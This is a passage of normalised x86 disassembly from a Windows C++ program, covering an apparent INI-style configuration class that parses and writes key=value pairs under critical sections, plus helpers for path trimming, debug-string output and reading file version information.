call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x0
push 0x3d
lea ecx [ ebp + 0xa004 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov esi eax
push esi
push 0x0
lea edx [ ebp + 0xa004 ]
push edx
lea ecx [ ebp + 0x9fb0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea ecx [ ebp + 0xa004 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
sub eax esi
push eax
inc esi
push esi
lea eax [ ebp + 0xa004 ]
push eax
lea ecx [ ebp + 0x9fcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push ebx
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0x5
lea ecx [ ebp + 0x9fcc ]
push ecx
mov ecx [ ebp - 0x60 ]
lea edx [ ebp + 0x9fb0 ]
push edx
lea eax [ ebp - 0x80 ]
push eax
add ecx 0x20
call sub_426d20
mov ecx eax
call sub_425e00
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ ebp + 0xa02c ] 0x4
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax edi
lea edx [ eax + 0x1 ]
jmp r-xdata
sub_4272d0
push 0xffffffff
push sub_43294b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa4
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov [ esp + 0x1c ] ebx
push rw-data
mov [ esp + 0xb4 ] eax
mov esi ecx
mov [ esp + 0x24 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0xbc ] 0x1
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xbc ] 0x2
mov edi [ esp + 0xc8 ]
add esi 0x20
push edi
mov ecx esi
call sub_4241d0
push edi
mov ecx esi
mov ebp eax
call sub_423fb0
lea ecx [ esp + 0x10 ]
push ecx
push ebp
push eax
mov [ esp + 0x1c ] ebx
call sub_425360
mov eax [ esp + 0x1c ]
mov ebp [ esp + 0xd8 ]
add esp 0xc
cmp eax ebx
je r-xdata
mov edx [ esp + 0xd0 ]
push edx
push edi
mov ecx esi
call sub_426d20
push ebp
mov ecx eax
mov [ esp + 0x14 ] eax
call sub_4243f0
mov ecx [ esp + 0x10 ]
push ebp
mov [ esp + 0x1c ] eax
call sub_424100
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push edx
push ecx
push eax
mov [ esp + 0x1c ] ebx
call sub_4253a0
mov eax [ esp + 0x1c ]
add esp 0xc
cmp eax ebx
je r-xdata
push ebp
lea ecx [ esp + 0x44 ]
push ecx
lea edx [ esp + 0x9c ]
push edx
call sub_4102e0
mov [ esp + 0xc8 ] 0x5
push eax
lea eax [ esp + 0x88 ]
push eax
call sub_423390
mov [ esp + 0xd0 ] 0x6
push eax
lea ecx [ esp + 0x74 ]
push ecx
call [ ??$?9DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x1c
mov [ esp + 0x17 ] al
mov [ esp + 0xbc ] 0x5
lea ecx [ esp + 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xbc ] 0x4
lea ecx [ esp + 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ esp + 0x17 ] bl
mov esi [ esp + 0xc4 ]
mov ecx esi
je r-xdata
lea edx [ esp + 0x24 ]
push edx
mov ecx esi
call sub_426d20
mov edi eax
push ebp
mov ecx edi
call sub_4243f0
push ebp
mov ecx edi
mov [ esp + 0x1c ] eax
call sub_424100
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
push eax
mov [ esp + 0x1c ] ebx
call sub_4253a0
mov eax [ esp + 0x1c ]
add esp 0xc
cmp eax ebx
je r-xdata
push ebp
push edi
mov ecx esi
call sub_426d20
mov ecx eax
call sub_425e00
push eax
jmp r-xdata
lea eax [ esp + 0x40 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edx [ esp + 0xd0 ]
push edx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
push ebp
lea eax [ esp + 0x28 ]
push eax
mov ecx esi
call sub_426d20
mov ecx eax
call sub_425e00
push eax
lea ecx [ esp + 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ esp + 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xbc ] 0x3
lea eax [ esp + 0x24 ]
push edi
push eax
call sub_423e40
add esp 0x8
mov [ esp + 0xbc ] 0x4
lea ecx [ esp + 0x24 ]
push ecx
mov ecx esi
call sub_4241d0
lea edx [ esp + 0x24 ]
push edx
mov ecx esi
mov edi eax
call sub_423fb0
lea ecx [ esp + 0x10 ]
push ecx
push edi
push eax
mov [ esp + 0x1c ] ebx
call sub_425360
mov eax [ esp + 0x1c ]
add esp 0xc
cmp eax ebx
je r-xdata
mov [ esp + 0x1c ] 0x1
mov [ esp + 0xbc ] 0x3
lea ecx [ esp + 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xbc ] 0x2
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xbc ] 0x1
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xbc ] bl
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0xb4 ]
pop edi
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0xa4 ]
pop ebx
call sub_42e72f
add esp 0xb0
retn 0x10
sub_4275b0
push 0xffffffff
push sub_432983
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push ebp
push esi
push edi
push rw-data
mov esi ecx
mov [ esp + 0x14 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x70 ] 0x0
mov ebp [ esp + 0x80 ]
mov edi [ esp + 0x7c ]
mov ebx [ esp + 0x78 ]
push ebp
push edi
add esi 0x20
push ebx
mov ecx esi
call sub_426d20
mov ecx eax
call sub_425e00
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push edi
lea eax [ esp + 0x50 ]
push ebp
push eax
call sub_4102e0
mov [ esp + 0x7c ] 0x1
push eax
lea ecx [ esp + 0x40 ]
push ecx
call sub_423390
mov ebp eax
mov [ esp + 0x84 ] 0x2
lea edx [ esp + 0x28 ]
push ebx
push edx
call sub_423e40
add esp 0x1c
mov [ esp + 0x70 ] 0x3
push ebp
push edi
push eax
mov ecx esi
call sub_426d20
mov ecx eax
call sub_425e00
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ esp + 0x70 ] 0x2
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x70 ] 0x1
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x70 ] 0x0
lea ecx [ esp + 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x70 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x68 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x64
retn 0xc
sub_4276c0
push 0xffffffff
push sub_4329a2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
mov eax [ esp + 0x50 ]
push esi
mov esi ecx
push eax
lea ecx [ esp + 0x24 ]
push ecx
call sub_42a7e0
add esp 0x8
mov [ esp + 0x44 ] 0x0
mov edx [ esp + 0x50 ]
push eax
mov eax [ esp + 0x50 ]
push edx
push eax
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call sub_4272d0
mov [ esp + 0x44 ] 0x1
push eax
call sub_42a3f0
add esp 0x4
mov esi eax
mov [ esp + 0x44 ] 0x0
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x44 ] 0xffffffff
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x3c ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x44
retn 0xc
sub_427760
push 0xffffffff
push sub_4329b9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ esp + 0x34 ]
push esi
mov esi ecx
push eax
lea ecx [ esp + 0x8 ]
push ecx
call sub_42a7e0
add esp 0x8
mov [ esp + 0x28 ] 0x0
mov edx [ esp + 0x34 ]
push eax
mov eax [ esp + 0x34 ]
push edx
push eax
mov ecx esi
call sub_4275b0
mov [ esp + 0x28 ] 0xffffffff
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0xc
sub_4277d0
push 0xffffffff
push sub_4329e2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
mov eax [ esp + 0x54 ]
push esi
push edi
mov esi ecx
mov ecx [ esp + 0x58 ]
push eax
push ecx
lea edx [ esp + 0x2c ]
push edx
call sub_42a970
add esp 0xc
mov [ esp + 0x48 ] 0x0
mov ecx [ esp + 0x50 ]
push eax
mov eax [ esp + 0x58 ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push edx
mov ecx esi
call sub_4272d0
mov [ esp + 0x48 ] 0x1
push eax
call sub_42a450
add esp 0x4
mov esi eax
mov edi edx
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x48 ] 0xffffffff
lea ecx [ esp + 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x40 ]
mov edx edi
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x44
retn 0x10
sub_427870
push 0xffffffff
push sub_4329f9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ esp + 0x38 ]
push esi
mov esi ecx
mov ecx [ esp + 0x38 ]
push eax
push ecx
lea edx [ esp + 0xc ]
push edx
call sub_42a970
add esp 0xc
mov [ esp + 0x28 ] 0x0
mov ecx [ esp + 0x30 ]
push eax
mov eax [ esp + 0x38 ]
push eax
push ecx
mov ecx esi
call sub_4275b0
mov [ esp + 0x28 ] 0xffffffff
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x10
sub_4278e0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_426dd0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_427910
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_426dd0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_427940
push 0xffffffff
push sub_432a18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_426dd0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
mov ecx [ esp + 0xc ]
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4279a0
push 0xffffffff
push sub_432a7d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa4
push ebx
push esi
push edi
mov edi ecx
mov [ esp + 0x18 ] edi
mov [ edi ] r--data
mov [ esp + 0xb8 ] 0x2
mov esi [ edi + 0x30 ]
mov eax [ esi ]
cmp eax esi
mov [ esp + 0x10 ] eax
je r-xdata
push 0x1
push 0x1b6
lea ecx [ edi + 0x4 ]
push 0x2
mov [ esp + 0x20 ] ecx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ esp + 0x2c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
mov [ esp + 0xb8 ] 0x3
mov eax [ esp + 0x78 ]
xor ebx ebx
cmp eax ebx
je r-xdata
call [ eax + 0xc ]
lea ecx [ esp + 0x10 ]
call sub_4242a0
mov eax [ esp + 0x10 ]
cmp eax esi
jne r-xdata
mov [ esp + 0xb8 ] 0x2
lea ecx [ esp + 0x1c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
mov [ esp + 0xb8 ] 0x1
lea esi [ edi + 0x2c ]
mov [ esp + 0xc ] esi
mov [ esp + 0xb8 ] 0x1
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea ecx [ esp + 0x14 ]
push ecx
mov ecx esi
call sub_4255e0
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esp + 0xb8 ] bl
lea esi [ edi + 0x20 ]
mov [ esp + 0xc ] esi
mov [ esp + 0xb8 ] bl
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push edx
mov ecx esi
call sub_426dd0
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esp + 0xb8 ] 0xffffffff
mov ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0xb0 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xb0
retn
mov eax [ edi + 0x24 ]
push ebp
mov ebp [ eax ]
cmp ebp eax
mov [ esp + 0x10 ] eax
je r-xdata
lea ecx [ esp + 0x20 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
pop ebp
nop
mov eax [ std::endl@IAT ]
push eax
lea ecx [ esp + 0x24 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::operator<<@IAT ]
cmp [ ebp + 0x35 ] bl
jne r-xdata
mov edi edi
cmp ebp [ esp + 0x10 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x35 ] bl
jne r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x45 ] bl
jne r-xdata
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx [ std::endl@IAT ]
mov esi [ ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@D@Z@IAT ]
push ecx
push 0x5d
push eax
lea edx [ esp + 0x2c ]
push 0x5b
push edx
call esi
add esp 0x8
push eax
call [ ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z@IAT ]
add esp 0x8
push eax
call esi
add esp 0x8
mov ecx eax
call [ std::basic_ostream<char,struct std::char_traits<char> >::operator<<@IAT ]
mov eax [ ebp + 0x2c ]
mov esi [ eax ]
cmp esi eax
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x35 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x35 ] bl
jne r-xdata
lea ecx [ esi + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
lea ecx [ esi + 0x28 ]
mov edi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx [ std::endl@IAT ]
push ecx
push eax
push 0x3d
push edi
mov edi [ ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z@IAT ]
lea edx [ esp + 0x30 ]
push edx
call edi
add esp 0x8
push eax
call [ ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@D@Z@IAT ]
add esp 0x8
push eax
call edi
add esp 0x8
mov ecx eax
call [ std::basic_ostream<char,struct std::char_traits<char> >::operator<<@IAT ]
cmp [ esi + 0x45 ] bl
jne r-xdata
mov edi [ esp + 0x1c ]
mov eax [ esi + 0x4 ]
cmp [ eax + 0x45 ] bl
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x45 ] bl
jne r-xdata
mov ebp eax
jmp r-xdata
mov ebp ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x35 ] bl
je r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
lea ecx [ ecx ]
cmp ebp [ eax + 0x8 ]
jne r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] bl
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x45 ] bl
je r-xdata
jmp r-xdata
mov ebp eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x35 ] bl
je r-xdata
sub_427c40
push 0xffffffff
push sub_432a98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_424880
mov [ esi + 0x4 ] eax
mov [ eax + 0x35 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_427ca0
push 0xffffffff
push sub_432ad2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_427c40
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0x2c ]
call sub_426060
mov [ esp + 0x10 ] 0x2
mov ecx esi
call sub_423230
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_427d30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_432af3
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
push rw-data
mov [ esp + 0x4 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x10 ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ rw-data ]
push 0x38
call sub_42e3bc
add esp 0x4
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_427ca0
jmp r-xdata
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] eax
sub_427dd0
push 0xffffffff
push sub_432b1a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
add ecx 0x1c
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push ecx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_427e30
push esi
mov esi [ esp + 0x8 ]
push esi
call [ wcslen@IAT ]
add esp 0x4
test eax eax
mov ecx eax
jle r-xdata
pop esi
retn
dec ecx
cmp [ esi + ecx * 2 ] 0x5c
je r-xdata
lea edx [ ecx + 0x1 ]
cmp edx eax
jge r-xdata
test ecx ecx
jne r-xdata
mov [ esi + ecx * 2 + 0x2 ] 0x0
pop esi
retn
sub_427e70
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ eax ]
push esi
mov esi [ esp + 0x8 ]
push ecx
push 0x5c
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov edx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ edx ]
cmp eax ecx
je r-xdata
pop esi
retn
push ecx
inc eax
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
sub_427ea0
push 0xffffffff
push sub_432b5c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
mov eax [ rw-data ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x3c ] eax
mov [ esp ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x48 ] 0x1
call sub_4203a0
test eax eax
je r-xdata
push esi
mov esi [ esp + 0x54 ]
lea edx [ esp + 0x24 ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x4c ] 0x0
lea ecx [ esp + 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x44 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x40 ]
pop esi
call sub_42e72f
add esp 0x4c
retn
lea ecx [ esp + 0x4 ]
push ecx
mov ecx eax
call sub_427dd0
mov [ esp + 0x48 ] 0x2
push eax
lea ecx [ esp + 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ esp + 0x48 ] 0x1
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_427f80
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x80c
mov eax [ rw-data ]
push edi
mov [ esp + 0x80c ] eax
xor eax eax
mov [ esp + 0x8 ] 0x0
mov ecx 0x1ff
lea edi [ esp + 0xa ]
[ edi ]
mov ecx [ ebp + 0x8 ]
stosw [ edi ]
lea eax [ ebp + 0xc ]
push eax
push ecx
lea edx [ esp + 0x10 ]
push edx
call [ vswprintf@IAT ]
add esp 0xc
lea eax [ esp + 0x8 ]
push eax
call [ OutputDebugStringW@IAT ]
mov ecx [ esp + 0x80c ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
sub_427ff0
push 0xffffffff
push sub_432ba8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x114
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
lea ecx [ esp + 0x38 ]
mov [ esp + 0x11c ] eax
mov [ esp + 0x10 ] ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x128 ] 0x1
mov edi [ esp + 0x134 ]
lea eax [ esp + 0x14 ]
push eax
push edi
mov [ esp + 0x1c ] ebx
call GetFileVersionInfoSizeW
mov esi eax
cmp esi ebx
jbe r-xdata
mov esi [ esp + 0x130 ]
lea ecx [ esp + 0x38 ]
push ecx
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x128 ] bl
lea ecx [ esp + 0x38 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x120 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x114 ]
pop ebx
call sub_42e72f
add esp 0x120
retn
push ebp
push esi
call [ malloc@IAT ]
add esp 0x4
mov ebp eax
push ebp
push esi
push ebx
push edi
call GetFileVersionInfoW
test eax eax
je r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
pop ebp
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x14 ]
push edx
push r--data
push ebp
mov [ esp + 0x20 ] ebx
mov [ esp + 0x2c ] ebx
call VerQueryValueW
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ eax + 0x10 ]
mov esi [ eax + 0x14 ]
xor eax eax
mov [ esp + 0x58 ] bx
mov ecx 0x31
lea edi [ esp + 0x5a ]
[ edi ]
stosw [ edi ]
mov eax esi
and eax 0xffff
push eax
mov ecx edx
shr esi 0x10
push esi
and ecx 0xffff
push ecx
shr edx 0x10
push edx
lea edx [ esp + 0x68 ]
push r--data
push edx
call [ swprintf@IAT ]
add esp 0x18
lea eax [ esp + 0x58 ]
push eax
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x12c ] 0x2
push eax
lea ecx [ esp + 0x40 ]
